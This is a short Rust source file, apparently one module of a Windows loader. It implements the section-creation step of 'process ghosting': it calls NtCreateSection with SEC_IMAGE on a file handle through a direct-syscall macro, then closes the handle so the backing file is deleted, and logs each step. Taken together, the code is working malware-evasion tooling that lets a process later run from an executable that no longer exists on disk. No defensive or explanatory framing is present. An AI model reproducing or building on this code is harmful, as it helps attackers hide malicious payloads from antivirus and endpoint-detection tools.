use core::ptr::null_mut;
use windows_sys::Win32::System::{
    Memory::{PAGE_READONLY, SEC_IMAGE},
    SystemServices::SECTION_ALL_ACCESS,
};

use crate::{log, syscall};

pub unsafe fn create_ghost_section(file_handle: isize, close_file: bool) -> Option<usize> {
    unsafe {
        let mut section_handle: usize = 0;
        let status = syscall!(
            "NtCreateSection",
            &mut section_handle,
            SECTION_ALL_ACCESS,
            null_mut::<u8>(),
            null_mut::<u8>(),
            PAGE_READONLY,
            SEC_IMAGE,
            file_handle
        );

        if status < 0 {
            log!("NtCreateSection failed: 0x{:X}", status as u32);
            syscall!("NtClose", file_handle);
            return None;
        }

        log!(
            "NtCreateSection succeeded. Section handle = 0x{:X}",
            section_handle
        );

        if close_file {
            syscall!("NtClose", file_handle);
            log!("File handle closed — file deleted.");
        }
        Some(section_handle)
    }
}
